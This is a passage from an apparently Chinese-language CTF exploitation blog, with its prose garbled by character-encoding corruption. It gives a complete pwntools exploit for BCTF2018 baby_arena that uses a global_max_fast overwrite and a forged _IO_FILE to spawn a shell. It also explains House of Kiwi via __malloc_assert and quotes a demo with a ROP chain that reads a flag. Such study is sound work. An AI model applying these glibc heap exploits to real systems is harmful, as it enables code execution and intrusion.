href="#ä¾‹é¢˜-v2">Â¶</a>ä¾‹é¢˜</h3><h4 id="baby-arena-BCTF2018-libc2-27-3ubuntu1-2"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-27-3ubuntu1-2">Â¶</a>baby_arena_BCTF2018 &lt;libc2.27-3ubuntu1.2&gt;</h4><h5 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h5><p>å’Œ 2.23 ä¸€æ ·ã€‚</p><h5 id="æ€è·¯-v2"><a class="header-anchor" href="#æ€è·¯-v2">Â¶</a>æ€è·¯</h5><p>æ€è·¯å’Œä¸Šé¢˜ä¸€æ¯›ä¸€æ ·ã€‚æ³¨æ„æ”¹ä¸€ä¸‹åç§»ï¼Œä»¥åŠ global_max_fast åˆ©ç”¨æ—¶å€™çš„å †å—å¤§å°ã€‚</p><h5 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1430</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>)<br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3e8360</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br>global_max_fast = libc_base + <span class="hljs-number">0x3ed940</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br><span class="hljs-comment"># aw(one_gadget,libc_base+0x3c67f8-8)</span><br>aw(system_addr,global_max_fast - <span class="hljs-number">8</span>)<br>pause()<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span>+p64(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br><br>add(<span class="hljs-number">0x1430</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h5 id="è°ƒè¯•-v2"><a class="header-anchor" href="#è°ƒè¯•-v2">Â¶</a>è°ƒè¯•</h5><p>è°ƒè¯•æ‹¿ <strong>_IO_str_overflow</strong> ç®€å•è¿‡ä¸€éã€‚çœ‹å®Œäº† 2.23 å 2.27 åªéœ€è¦æ˜ç™½å’‹è¿›çš„ <code>_IO_str_overflow</code> å°±è¡Œäº†ã€‚</p><p>æˆ‘ä»¬æ„é€ çš„ç»“æ„ä½“ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200847128.png" alt="image-20220525200847128"></p><p>ç»“æ„ä½“ vtable å‡½æ•°è¡¨ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200927604.png" alt="image-20220525200927604"></p><p>é‚£ä¹ˆåœ¨éå†åˆ°æˆ‘ä»¬çš„ç»“æ„ä½“è°ƒç”¨ <code>_IO_OVERFLOW</code> å®é™…å°±æ˜¯åœ¨è°ƒç”¨ <code>_IO_str_overflow</code>ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201020570.png" alt="image-20220525201020570"></p><p>ä¸€è·¯ si è·Ÿè¿›ï¼Œæœ€ååœ¨é¢„æœŸä½ç½® getshell ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201106629.png" alt="image-20220525201106629"></p><hr><h2 id="Libc"><a class="header-anchor" href="#Libc">Â¶</a>??? &lt;= Libc &lt;= ???</h2><blockquote><p>kiwi æ˜¯åˆ©ç”¨è·¯çº¿ï¼Œå¿…è¦çš„è¯ç”¨ husk è¿‡æ¸¡ï¼Œemma å’Œ pig æ˜¯åˆ©ç”¨æ–¹æ³•ã€‚</p><footer><strong>é£æ²äº‘çƒŸ</strong></footer></blockquote><p>ğŸ‘´ å…¶å®æ˜¯å°±æ˜¯ä¸ºäº†å†™è¿™éƒ¨åˆ†æ‰å¼€çš„è¿™ç¯‡åšå®¢ã€‚ä»è¿™é‡Œå¼€å§‹æ‰èƒ½ç§°ä½œæ˜¯æè‰ºæœ¯ã€‚</p><p><strong>???</strong> çš„æ„æ€æ˜¯è¿™ä¸‹é¢çš„å‡ ä¸ªåˆ©ç”¨æ¶‰åŠåˆ°çš„æ€æƒ³å’Œæ‰‹æ³•ï¼Œä»è¿‡å»ä¸€ç›´åˆ°æœªæ¥çš„ä¸€æ®µæ—¶é—´é‡Œä¸ä¼šè¿‡æ—¶ã€‚</p><p>ä½ æš‚æ—¶çœ‹ä¸åˆ°å°±æ˜¯ ğŸ‘´ è¿˜æ²¡å†™å®Œã€‚</p><h3 id="House-of-Kiwi-libc-2-36æˆ‘çœŸçš„å“­æ­»"><a class="header-anchor" href="#House-of-Kiwi-libc-2-36æˆ‘çœŸçš„å“­æ­»">Â¶</a>House of Kiwi(libc&lt;2.36æˆ‘çœŸçš„å“­æ­»)</h3><p>å…ˆçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªä¸­æˆ‘æœ€å…ˆå­¦ä¹ åˆ°çš„ <strong>kiwi</strong> ï¼Œç”± <code>fmyy</code> å¸ˆå‚…æå‡ºï¼Œå‘è¡¨äº <a href="https://www.anquanke.com/post/id/235598">å®‰å…¨å®¢</a> ã€‚</p><h4 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h4><h5 id="malloc-assert"><a class="header-anchor" href="#malloc-assert">Â¶</a>__malloc_assert</h5><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibcä¸­ptmallocéƒ¨åˆ†,ä»ä»¥å‰åˆ°ç°åœ¨éƒ½å­˜åœ¨ä¸€ä¸ªassretæ–­è¨€çš„é—®é¢˜,æ­¤å¤„å­˜åœ¨ä¸€ä¸ª <strong>fflush(stderr)</strong> çš„å‡½æ•°è°ƒç”¨,å…¶ä¸­ä¼šè°ƒç”¨<code>_IO_file_jumps</code> ä¸­çš„syncæŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br><span class="hljs-built_in">fflush</span> (stderr);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>fflush:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> fflush(s) _IO_fflush (s)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_fflush (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> _IO_flush_all ();<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">int</span> result;<br>      CHECK_FILE (fp, EOF);<br>      _IO_acquire_lock (fp);<br>      result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>      _IO_release_lock (fp);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_fflush)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­è°ƒç”¨äº† vtable å¯¹åº”åç§»çš„ <code>_IO_SYNC</code> å‡½æ•°ã€‚å¦‚æœä½ çŸ¥é“ä½ç‰ˆæœ¬çš„ FSOP çš„åŸºæœ¬åŸç†ï¼Œé‚£ä¹ˆå¤§æ¦‚å°±çŸ¥é“ <strong>kiwi</strong> çš„åˆ©ç”¨æ€è·¯äº†ã€‚</p></li></ul><h4 id="ä½¿ç”¨åœºæ™¯"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><ol><li><p>èƒ½å¤Ÿè§¦å‘<code>__malloc_assert</code>,é€šå¸¸æ˜¯å †æº¢å‡ºå¯¼è‡´ï¼Œä½† ğŸ‘´ å‘ç°å®é™…è¿‡ç¨‹ä¸­å¤§å¤šæ•°éƒ½æ˜¯ ğŸ‘ topchunkã€‚</p></li><li><p>èƒ½å¤Ÿä»»æ„å†™,ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_file_sync = setcontext + <span class="hljs-number">61</span><span class="hljs-comment">// &amp;_IO_file_jumps + 0x60</span><br></code></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_helper_jumps + <span class="hljs-number">0xA0</span> and <span class="hljs-number">0xA8</span><br><span class="hljs-comment">//   rsp      rcx</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="ä¿©ç‚¹è¯´æ˜"><a class="header-anchor" href="#ä¿©ç‚¹è¯´æ˜">Â¶</a>ä¿©ç‚¹è¯´æ˜</h4><p>å…³äºåœºæ™¯ 1ï¼ŒğŸ‘ topchunk æœ‰å¾ˆå¤šç§ ğŸ‘ æ³•ï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p><ol><li>ç›´æ¥æº¢å‡ºæˆ–è€…åˆ†é…ä¸ª chunk å»æŠŠ topchunk size æ‰¬äº†</li><li>Largebin Attack é”™ä½æ‰“ topchunk size</li><li>Largebin Attack æˆ–è€…åˆ†é…ä¸ª chunk è¿‡å» ğŸ‘ main_arena ä¸­çš„ topchunk å‘ä½</li></ol><p>å…³äºåœºæ™¯ 2ï¼ŒğŸ‘´ ä¸å¾—ä¸æä¸€å“ˆï¼Œè¿™åªæ˜¯<strong>æœ€åˆæœ€åŸºæœ¬</strong>çš„ kiwi éœ€è¦ä»»æ„å†™è¿™ä¸ªæ¯”è¾ƒå¼ºçš„æ¡ä»¶ï¼Œfmyy å¸ˆå‚…è¿˜æ•™äº† ğŸ‘´ å’Œå…¶ä»–çš„ house ä¸€èµ·ç©çš„ä»… <code>Largebin Attack</code> è¾ƒå¼±æ¡ä»¶æ€è·¯ï¼Œå…·ä½“çš„è¯åç»­çš„ä¾‹é¢˜åº”è¯¥ä¼šæœ‰ã€‚</p><h4 id="Demo-v2"><a class="header-anchor" href="#Demo-v2">Â¶</a>Demo</h4><p>fmyy å¸ˆå‚…æ¼”ç¤ºçš„ DEMOï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span><br><span class="hljs-comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret pop_rdi_ret+1</span><br><span class="hljs-type">size_t</span> libc_base;<br><span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x30</span>];<br><span class="hljs-type">char</span> FLAG[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;./flag.txt\x00&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> sfi[] =&#123;<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000004</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0xC000003E</span>&#125;,<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x40000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0xFFFFFFFF</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0000003B</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x7FFF0000</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;<br>    &#125;;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_fprog</span> sfp = &#123;<span class="hljs-number">8</span>, sfi&#125;;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setROP</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rax_ret;<br>    ROP[i++] = <span class="hljs-number">2</span>;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)FLAG;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = syscall_ret;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">3</span>;<br>    ROP[i++] = pop_rdx_r12;<br>    ROP[i++] = <span class="hljs-number">0x100</span>;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)(FLAG + <span class="hljs-number">0x10</span>);<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)read;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">1</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)write;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setvbuf</span>(stdin,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stdout,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stderr,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">sandbox</span>();<br>    libc_base  = ((<span class="hljs-type">size_t</span>)setvbuf) - <span class="hljs-number">0x81630</span>;<br>    <span class="hljs-built_in">printf</span>(<span 